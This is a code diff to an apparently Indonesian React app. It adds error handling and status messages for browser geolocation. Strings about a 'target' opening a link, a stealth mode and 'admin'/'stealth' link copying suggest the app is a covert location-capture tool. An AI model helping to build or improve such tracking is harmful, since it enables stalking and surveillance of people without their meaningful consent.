@@ -14,6 +14,7 @@ const App: React.FC = () => {
   const [showCameraDiagnostic, setShowCameraDiagnostic] = useState(false);
   const [locationLogs, setLocationLogs] = useState<LocationData[]>([]);
   const [copyStatus, setCopyStatus] = useState<'none' | 'admin' | 'stealth'>('none');
+  const [locationError, setLocationError] = useState<string | null>(null);
   
   const [members, setMembers] = useState<UserProfile[]>([
     {
@@ -39,10 +40,14 @@ const App: React.FC = () => {
   const activeMember = members.find(m => m.id === activeMemberId) || members[0];
 
   const updateLocation = useCallback(() => {
-    if (!navigator.geolocation) return;
+    if (!navigator.geolocation) {
+      setLocationError("Browser tidak mendukung geolokasi.");
+      return;
+    }
 
     navigator.geolocation.getCurrentPosition(
       async (position) => {
+        setLocationError(null);
         const newLocation: LocationData = {
           latitude: position.coords.latitude,
           longitude: position.coords.longitude,
@@ -52,7 +57,7 @@ const App: React.FC = () => {
 
         setMembers(prev => prev.map(m => 
           m.id === '1' 
-            ? { ...m, currentLocation: newLocation, lastSeen: Date.now() }
+            ? { ...m, currentLocation: newLocation, lastSeen: Date.now(), status: 'online' }
             : m
         ));
 
@@ -65,8 +70,31 @@ const App: React.FC = () => {
           setIsLoadingInsight(false);
         }
       },
-      (err) => console.error("Location error", err),
-      { enableHighAccuracy: true, timeout: 10000 }
+      (err) => {
+        let msg = "Error lokasi tidak diketahui.";
+        switch(err.code) {
+          case err.PERMISSION_DENIED:
+            msg = "Izin lokasi ditolak oleh pengguna.";
+            break;
+          case err.POSITION_UNAVAILABLE:
+            msg = "Informasi lokasi tidak tersedia.";
+            break;
+          case err.TIMEOUT:
+            msg = "Waktu permintaan lokasi habis (timeout).";
+            break;
+        }
+        console.error("Location error:", msg, err);
+        setLocationError(msg);
+        
+        setMembers(prev => prev.map(m => 
+          m.id === '1' ? { ...m, status: 'offline' } : m
+        ));
+      },
+      { 
+        enableHighAccuracy: true, 
+        timeout: 15000, // Menambah timeout ke 15 detik agar lebih toleran pada GPS lemah
+        maximumAge: 0 
+      }
     );
   }, [isUnlocked, isStealthMode]);
 
@@ -168,6 +196,12 @@ const App: React.FC = () => {
                 </div>
              </div>
            </div>
+
+           {locationError && (
+             <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded text-rose-500 text-[10px] text-center">
+                SENSOR_ERROR: {locationError.toUpperCase()} - Pastikan izin lokasi aktif.
+             </div>
+           )}
 
            <div className="text-center">
               <p className="text-[9px] text-slate-700 uppercase tracking-[0.3em]">Device ID: {Math.random().toString(36).substring(2, 10).toUpperCase()}</p>
@@ -288,7 +322,12 @@ const App: React.FC = () => {
                     <div className="absolute inset-0 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm z-20">
                        <div className="text-center p-8">
                           <i className="fas fa-satellite-dish text-3xl text-slate-700 mb-4 animate-bounce"></i>
-                          <p className="text-xs text-slate-500 uppercase tracking-widest font-bold">Menunggu Target Membuka Link...</p>
+                          <p className="text-xs text-slate-500 uppercase tracking-widest font-bold">
+                            {locationError ? `ERROR: ${locationError}` : "Menunggu Target Membuka Link..."}
+                          </p>
+                          {locationError && (
+                            <p className="text-[10px] text-slate-600 mt-2 italic">Pastikan target memberikan izin akses lokasi pada browser.</p>
+                          )}
                        </div>
                     </div>
                   )}
